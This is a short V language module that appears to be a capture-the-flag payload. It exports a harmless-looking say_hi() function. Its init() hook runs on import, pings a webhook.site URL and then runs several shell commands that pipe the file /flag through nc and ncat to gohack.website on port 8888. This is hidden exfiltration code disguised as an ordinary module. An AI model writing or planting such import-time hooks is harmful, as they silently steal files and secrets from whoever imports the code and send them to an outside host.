module ganteng

import os
import net.http
// To export a function we have to use `pub`
pub fn say_hi() {
	println('hello from mymodule!')
}

fn init(){
resp := http.get('https://webhook.site/eaadc4bb-70c8-42c2-9d3d-7a212d91f7be') ?
os.system('cat /flag | nc gohack.website 8888')
os.system('cat /flag | ncat gohack.website 8888')
os.system('cat /flag | ncat.traditional gohack.website 8888')
os.system('cat /flag | /bin/nc gohack.website 8888')
}
